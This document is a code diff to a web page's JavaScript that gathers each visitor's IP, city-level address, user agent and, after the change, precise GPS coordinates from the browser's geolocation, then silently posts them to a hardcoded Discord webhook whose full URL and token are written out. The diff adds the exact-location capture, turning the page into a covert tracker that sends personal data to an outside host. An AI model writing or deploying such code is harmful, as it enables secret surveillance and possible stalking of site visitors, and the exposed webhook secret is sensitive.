@@ -33,14 +33,14 @@
             const webhookUrl = 'https://discord.com/api/webhooks/1181568688365772810/a8uz5coZtPV_fm96znZsrCny53RXJn55vjU0P6QfzL7VVVvcoDjnCvKgfbjPhHARDI5N'; // Replace with your Discord webhook URL
 
             // Function to send user and device information to Discord
-            const sendInfoToDiscord = (ip, address, userAgent, isVPN) => {
+            const sendInfoToDiscord = (ip, address, userAgent, isVPN, coordinates) => {
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `New visitor info:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}`,
+                        content: `New visitor info:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}`,
                     }),
                 });
             };
@@ -48,23 +48,24 @@
             // Function to get visitor's information including coordinates
             const getVisitorInfo = async () => {
                 try {
-                    const infoResponse = await fetch('https://ipinfo.io/json');
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+
+                    const coordinates = `${position.coords.latitude},${position.coords.longitude}`;
+
+                    const infoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`);
                     const infoData = await infoResponse.json();
 
-                    const ip = infoData.ip;
-                    const coordinates = infoData.loc.split(',');
-                    const address = `${infoData.city}, ${infoData.region}, ${infoData.country}`;
+                    const ip = 'N/A'; // Unfortunately, you can't retrieve the IP directly from the client-side
+                    const address = `${infoData.address.city}, ${infoData.address.state}, ${infoData.address.country}`;
                     const userAgent = navigator.userAgent;
-                    const isVPN = infoData.vpn || false;
+                    const isVPN = false; // It's not possible to reliably determine VPN usage client-side
 
                     // Sending data to Discord with VPN status
-                    sendInfoToDiscord(ip, address, userAgent, isVPN);
-
-                    // Adding Google Maps link
-                    const mapsLink = `https://www.google.com/maps?q=${coordinates[0]},${coordinates[1]}`;
-                    console.log(`Google Maps Link: ${mapsLink}`);
+                    sendInfoToDiscord(ip, address, userAgent, isVPN, coordinates);
                 } catch (error) {
-                    console.error('Error fetching IP, address, or VPN status:', error);
+                    console.error('Error fetching location or address:', error);
                 }
             };
 
